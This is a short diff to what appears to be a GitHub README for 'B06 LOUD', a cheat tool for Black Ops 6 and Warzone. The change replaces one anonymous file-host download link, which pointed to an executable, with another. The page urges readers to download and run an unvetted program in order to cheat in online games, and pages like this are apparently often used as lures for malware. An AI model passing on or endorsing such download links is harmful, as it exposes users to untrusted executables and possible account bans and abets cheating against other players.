@@ -2,7 +2,7 @@
 
 ![image](https://github.com/user-attachments/assets/113fa190-7025-47f8-9cf8-dba6d14d2f1a)
 
-(DOWNLOAD LINK) ~~~~(https://gofile.to/mbQB/loud.exe)
+(DOWNLOAD LINK) ~~~~ https://gofile.io/d/0QD1tC
 
 B06 LOUD
 Get ready to elevate your BO6+Warzone gaming experience to a whole new level with our feature-packed cheat and blocker!
